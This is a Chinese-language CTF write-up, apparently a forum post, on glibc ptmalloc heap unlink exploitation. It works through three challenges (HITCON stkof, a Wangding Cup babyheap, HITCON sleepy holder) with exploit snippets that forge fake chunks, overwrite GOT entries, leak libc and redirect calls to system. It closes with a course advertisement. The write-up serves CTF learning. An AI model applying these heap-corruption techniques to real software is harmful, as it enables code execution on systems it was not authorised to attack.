
# [原创]ctf ptmalloc pwn unlink

`unlink`是CTF中非常常见的一种题型

本文的着重点在于思路，因此并没有完整的去讲解例题，因为网上已经有不少的write up了，所以只是把认为重要的思路点总结了一下。

## unlink时的一些性质

`unlink`是在`free`掉一个`chunk`的时候，如果与之相邻的`chunk`是`free`状态，并且不是投票`chunk`时，会将`chunk`从原来的链表中`unlink`，并触发合并，`fast bin`并不会触发合并，只有当满足条件触发`fast bin`合并时，即当申请的`chunk`大小大于`fast bins`，在搜素`smallbins`之前，会将相邻的`fastbins chunk`合并。

## unlink检查

`unlink`时需要检查`chunk`的`fd`指向的`chunk`的`bk`是否指向当前`chunk`，`bk`指针指向的`fd`是否指向当前`chunk`。

## unlink最终实现的效果

`unlink`最终会实现任意地址写，但写的东西是固定的地址，将`fd`地址+`0x18`写为`chunk`的`bk`，将`bk`+`0x10`写入`chunk`的`fd`。如果是个全局变量存储每个`chunk`的地址，即可通过`edit`改写全局变量。

## 例题

CTF题目常见的一种`unlink`是题目中存在一个全局变量数组，用这个数组存储`malloc`之后的指针。如此，只要覆盖申请出来的一块`chunk`的`fd`为全局变量-`0x10`，`bk`为-`0x18`，这样即可通过检查。

### 例1 hitcon ctf stkof

此题存在一个可以无限写的函数，属于最简单的一种`unlink`，直接通过堆溢出改写`chunk`结构。

假设全局变量为`example`

```
alloc(0x30) #0
alloc(0x80) #1
alloc(0x20) #2
alloc(0x30) #3
alloc(0x40) #4
payload = p64(0x0)+p64(0x30)+p64(example - 0x18)+p64(example - 0x10)
```

`example`第一项存储的是`0`的地址，因此将`0`的`fd`和`bk`改了之后，可以绕过检查

```
payload += 'a'*0x10+p64(0x30)+p64(90)
free(1) #
```

触发`unlink` `example[0]`的值变为了 `example-0x18`

这个时候通过编辑`example[0]`即可实现对整个数组的控制。其后通过将`free`的`got`地址放入数组中的某一项，比如放入`example[2]`，然后改写`free`的`got`表地址为`puts`的`plt`地址

```
payload = ""
payload += p64(puts_got)+p64(free_got)+p64(atoi_got)
edit(0,'a'*0x18+payload)
edit(1,p64(puts_plt))
```

此时可以通过`free(0)`，这时会`puts(puts_got)`，打印了`puts`的`got`表地址，成功`leak libc`。有了`libc`之后，通过偏移量得倒`system`的地址，再利用同样的原理将`got`表改为`system`即可。至于`"/bin/sh"`可以随便放在一个`chunk`里面。

### 例2 网鼎杯的一道pwn

`babyheap`

这题的考察点在于，对`chunk size`的大小进行了限制，只能分配`0x30`大小的`chunk`，而且没有溢出，不能改写下一个`chunk`的`size`位的大小。但是这个题存在一个`use after free`漏洞，我们采取的利用思路是：首先通过`use after free`打印`fast bins chunk`，泄漏堆地址，之后我们改写链表尾部`chunk`的`fd`指针，使分配直接在堆上，从而覆盖一个`chunk`的`size`位，之后在堆上再伪造一块`free chunk`，触发`unlink`。

```
alloc(0,'A'*0x18+p64(0x31))
alloc(1,'A'*0x18+p64(0x31))
alloc(2,'A'*0x18+p64(0x31))
```

注意不要忘记伪造`size`位，以便于下面用来在此地申请`chunk`，从而改写`fast bins`的大小

```
free(0)
free(1)
free(2)
show(2)
p = s.recvuntil('Done')
p = p.ljust(8,'\x00')
heap = u64(p)
```

此时收到的`fd`的指针是指向`1`的，因为`fastbins`链表是后进先出

```
heap_base = heap - 0x30
edit(2,p64(heap_base+0x20))
```

`heap`的地址的到了，如何得到`libc`的基址呢？我们需要精心构造`chunk`，以便于我们改写`2`的`fd`

```
alloc(3,'a')
alloc(4,p64(0)+p64(0x101))
```

改写了`1`的`size`，下面需要伪造`chunk`

```
alloc(5,'a')
alloc(6,p64(0x0)+p64(0x41)+p64(example - 0x18)+p64(example - 0x10))
```

`example`为全局变量数组存放第`6`个`chunk`位置

```
alloc(7,'a'*0x10+p64(0x40)+p64(0x40))
free(1)
```

这个时候`free 1`，因为`1`的`size`满足`small bins`，会触发`unlink`，`0x101`的位置位于`7`中，是我们伪造的`chunk`，其`pre_size`是`0x40`，向前`0x40`正好是位于`6`中我们伪造的一个`chunk`中，会将其`unlink`下来，如此就可以将地址写入。之后的利用同上一个例子，改写`got`表。不过，有`show`，可以直接打印`got`表泄漏`libc`，不需要再改`free`了

### 例3

hitcon ctf sleepy holder

再进阶，增加限制只能申请`40 4000 400000`的`chunk`。而且只能申请三次，不能像上一题一样无限申请实现扩增`fast bin chunk unlink`。所以这题利用的是`fast bins consolidate`

`small middle big chunk`都只能存在一个：

```
add('small','a')
delete('small')
add('middle','b')
```

此时`small chunk`的`fast bins chunk`进入了`unsorted bins`，并将`middle chunk`的`pre in use`位值`0`

```
add('big','c')
delete('small')
```

此时`double free`，将`small chunk`再次放入了`fast bins`。这样做的目的是再次申请的时候维持`middle chunk`的`pre in use`位继续保持`0`

```
payload = p64(0)+p64(0x21)+p64(example - 0x18)+p64(example - 0x10)+p64(0x20)
```

伪造好了`unlink`的`fake chunk`，这个时候`free middle`即可实现`unlink`，改写全局变量，剩下的利用方法同例一例二

```
free('middle')
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
